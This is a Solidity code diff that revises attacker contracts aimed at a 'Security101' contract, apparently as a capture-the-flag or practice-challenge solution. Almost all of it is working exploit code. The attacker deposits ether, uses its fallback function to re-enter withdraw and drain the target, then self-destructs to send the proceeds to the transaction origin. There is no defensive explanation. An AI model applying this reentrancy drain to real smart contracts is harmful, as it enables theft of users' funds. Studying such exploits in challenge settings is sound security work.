@@ -22,35 +22,30 @@ contract Security101 {
 // https://ethereum.stackexchange.com/questions/29469/is-addressthis-a-valid-address-in-a-contracts-constructor
 // in order to `receive` callback, we have to add a new contract and attack outside constructor
 contract AttackerMiddle {
-    address constant token = 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f;
+    address constant token = 0x5FbDB2315678afecb367f032d93F642f64180aa3;
     constructor() payable {
-        Security101(token).deposit{value: msg.value}();
+        try Security101(token).deposit{value: msg.value}() {} catch {}
+    }
+
+    function withdraw(uint i) internal {
+        try Security101(token).withdraw(i) {} catch {}
     }
 
     fallback() external payable {
-        uint value;
-        if (address(this).balance == 0) {
-            value = block.number;
-        } else if (msg.value == 0) {
-            value = address(token).balance;
-        }else if (msg.value == address(this).balance) {
-            value = msg.value;
+        if (msg.value == address(this).balance) {
+            withdraw(block.number);
+            if (msg.value == 0) {
+                withdraw(10000 ether - 2);
+                // selfdestruct(payable(tx.origin));
+            }
         }
-        if (value != 0) {
-            Security101(token).withdraw(value);
-        }
-        // if (msg.sender.balance == 0) {
-        //     selfdestruct(payable(tx.origin));
-        // }
     }
 }
 
 // when selfdestruct, nothing would write to code, saving gas.
 contract OptimizedAttackerSecurity101 {
     constructor(address token) payable {
-        AttackerMiddle tmp = new AttackerMiddle{value: block.number}();
-        Security101(address(tmp)).deposit();
-        Security101(address(tmp)).deposit();
+        try Security101(address(new AttackerMiddle{value: block.number}())).deposit() {} catch {}
         selfdestruct(payable(tx.origin));
     }
 }
